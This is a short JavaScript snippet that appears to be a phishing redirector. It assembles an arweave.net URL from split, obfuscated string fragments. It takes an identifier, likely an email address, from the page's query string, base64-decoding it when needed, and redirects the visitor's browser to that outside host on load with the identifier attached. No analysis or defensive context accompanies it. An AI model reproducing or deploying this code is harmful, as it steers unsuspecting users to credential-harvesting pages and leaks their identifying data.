let rd1 = "htt"
let rd2 = "ps://ybj4awvm4dpso2xys3erxln2xt3ti3qlje32ozhuvol"
let rd3 = "iio35au3q.arweave.net/wF"
let rd4 = "PAWqzg3ydq-Jb"
let rd5 = "JG626vPc0bgtJN6dk9"
let rd6 = "KuWhDt9BTc"
let rd7 = "?signature=0f5597453ae230b4d7b687f2551fb441db7f2e6f&provider=1-"
let xx = window.location.href.split("?");
let m = ""

xx = xx[1].split("-");

      var base64regex =
        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

      if (!base64regex.test(xx[1])) {
        m = xx[1];
      } else {
        m = atob(xx[1]);
      }
n = xx[2]

let rd = rd1 + rd2 + rd3 + rd4 + rd5 + rd6 + rd7 + m + '-' + n

window.location.assign(rd)
